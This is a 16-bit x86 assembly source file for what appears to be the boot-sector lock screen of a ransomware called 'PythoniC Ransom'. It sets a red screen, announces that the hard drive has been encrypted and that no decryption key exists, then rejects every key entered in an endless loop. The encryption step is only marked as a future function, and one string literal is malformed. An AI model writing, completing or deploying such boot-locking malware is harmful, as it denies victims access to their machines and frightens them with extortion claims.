bits16              ; <= Compiler options. Compile to .bin file extension

mov ah, 0x00        ; <= Set null-pointer mode for change screen options
mov al, 0x03        ; <= Set screen format 640x200 [Check 0x03 param - http://www.columbia.edu/~em36/wpdos/videomodes.txt]
int 0x10            ; <= Use 10h interrupt

mov ah, 0x0B        ; <= Set screen style
mov bh, 0x00        ; <= Set screen style
mov bl, 0x04        ; <= Set background color: Red
int 0x10            ; <= Use 10h interrupt

jmp showFakeBanner  ; <= Jump to 'showFakeBanner' function address

showFakeBanner:                    ; <= Function 'ShowFakeBanner'
        mov si, firstString        ; <= Set text to SI register
        call printText             ; <= Call print text function

        mov si, secondString       ; <= Set text to SI register
        call printText             ; <= Call print text function

        mov si, thirdString        ; <= Set text to SI register
        call printText             ; <= Call print text function

        mov si, descriptionString  ; <= Set text to SI register
        call printText             ; <= Call print text function

        jmp getUserInput           ; <= Call function 'getUserInput'

getUserInput:
            mov si, fourghtString  ; <= Set text to SI register
            call printText         ; <= Call print text function
            mov di, inputString    ; <= Simple bug fix

getKeyLoop:
            mov ah, 0x00           ; <= Set function 'Reading' for interrupt 16h
            int 0x16               ; <= Use 16h interrupt

            mov ah, 0x0e           ; <= Set char types and colors
            cmp al, 0xD            ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            je getCheckKey         ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            int 0x10               ; <= Use 10h interrupt
            mov [di], al           ; <= Move AL to memory of DI address
            inc di                 ; <= DI += 1;
            jmp getKeyLoop         ; <= Loop | jump to function 'getKeyLoop'

getCheckKey:                        ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            mov byte [di], 0        ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            mov al, [inputString]   ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            mov si, invalidKey      ; <= Set text to SI register
            call printText          ; <= Call print text function
            jmp getUserInput        ; <= Jump to function 'getUserInput'

printText:                     ; <= Function 'printText'
        mov ah, 0x0e           ; <= Set the text print mode
        mov bh, 0x00           ; <= Set screen and text parameters
        mov bl, 0x07           ; <= Set screen and text parameters

printChar:
        mov al, [si]           ; <= Move bytecode from memory address [RAM] of SI to AL register

        cmp al, 0              ; <= If AL = 0...
        je endPrinting         ; <= Call function 'endPrinting'
                               ; <= Else...
        int 0x10               ; <= Use 10h interrupt
        add si, 1              ; <= Move +1 to SI register (inc si)
        jmp printChar          ; <= Jump to 'printChar' function. It's a simple loop

endPrinting:                   ; <= Function 'endPrinting'
        ret                    ; <= Return

firstString: db '================================================================================', 0xA, 0xD, 0  ; <= Text for show
secondString: db '        --/\/\/\/\/\/\>>>     You Have Been Infected By The PythoniC Ransom',  0xA, 0xD, 0          ; <= Text for show
thirdString: db '================================================================================', 0xA, 0xD, 0  ; <= Text for show
descriptionString: db ' Your hard drive had been encrypted LOL...', 0xA, 0xD,' There is no escape with out a decryption key', 0xA, 0xD,' BUT... this key doesnt exist!', 0xA, 0xD, ' LOL! ', 0xA, 0xD, ' ', 0xA, 0xD, ' Discription:', 0xA, 0xD, '---------------------------------------------', 0xA, 0xD, 'PythoniC is a ransom that isnt rly a ransom... there is no key, mabey.' ', 0xA, 0xD, ' HAVE FUN...', 0xA, 0xD, ' ', 0xA, 0xD, 0 ; <= Text for show
fourghtString: db ' Enter key: ', 0                                                               ; <= Text for show
invalidKey: db '  => Invalid key ', 0xA, 0xD, 0                                                      ; <= Error text for show
inputString: db ' ', 0                                                                                           ; <= Bug-fix text

times 1024-($-$$) db 0                                                                                           ; <= Add null-bytes in free space 
